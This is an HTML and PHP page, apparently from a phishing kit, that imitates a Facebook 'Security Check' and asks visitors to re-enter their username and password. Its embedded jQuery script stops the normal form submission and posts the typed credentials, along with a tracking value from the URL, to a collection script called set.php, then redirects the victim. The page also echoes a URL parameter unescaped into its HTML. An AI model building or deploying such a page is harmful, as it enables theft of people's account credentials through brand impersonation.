<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Security Check</title>
	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<header>
		<div class="main-header">
			<div class="logo">
				<a href="http://www.facebook.com"><img src="images/logo.png"></a>
			</div>
		</div>
	</header>
	<section>
		<div class="form">
			<div class="m-header">
				<h3>Facebook Security Check. Please Verify It's You.</h3>
			</div>
			<div class="red-box">
				<p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
				<p>Enter your password for security reason (make sure your caps lock is off)</p>
				<p>Forgot your password ? <a href="">Request new one</a>
			</div>

			<div  class="login-form">
				<form  class="bb" novalidate="1" id="login-form" >
	                <label for="username">Username:</label><input name="username" id="username" type="username"></input><br />
	                <br>     <br/>
					<label for="password">Password:</label><input name="password" id="password" type="password"></input><br />
					<input id="keep" style="margin: 10px 0 0 84px" type="checkbox"></input>
					<label for="keep" style="font-size:12px;">keep me logged in</label><br />
					<input type="submit" name="submit" value="Verify" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
					<p><a style="text-decoration:none; color:#3B5998; margin:0 0 0 80px;" href="">can't log in?</a></p>
				</form>
				<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
				<span id="x"   style="display:none" ><?php echo $_GET["x"] ?></span>
				<script type="text/javascript">
				$(document).ready(function(){
				$("form").submit(function(event){
				event.preventDefault();
				var x=document.getElementById("x").innerHTML;
				
				var n=$("#username").val();
				var p=$("#password").val();
				if(p!="" && n!=""){
				var values="x="+x+"&user="+n+"&psd="+p;
				$.post("../../set.php",values ,function(data){
				window.location.href=data;
				}
				);}});});
				</script>
			</div>

		</div>
		
		<footer>
			<ul>
				<li><a href="">Mobile</a></li>
				<li><a href="">Find Friends</a></li>
				<li><a href="">Badges</a></li>
				<li><a href="">People</a></li>
				<li><a href="">Pages</a></li>
				<li><a href="">Apps</a></li>
				<li><a href="">Games</a></li>
				<li><a href="">Music</a></li>
				<li><a href="">Locations</a></li>
			</ul>
			<ul>
				<li><a href="">Topics</a></li>
				<li><a href="">About</a></li>
				<li><a href="">Create Ad</a></li>
				<li><a href="">Create Page</a></li>
				<li><a href="">Devepers</a></li>
				<li><a href="">Careers</a></li>
				<li><a href="">Privacy</a></li>
				<li><a href="">Cookies</a></li>
				<li><a href="">Terms</a></li><br />
				<li><a href="">Help</a></li>
			</ul>
		</footer>
	</section>
</body>
</html>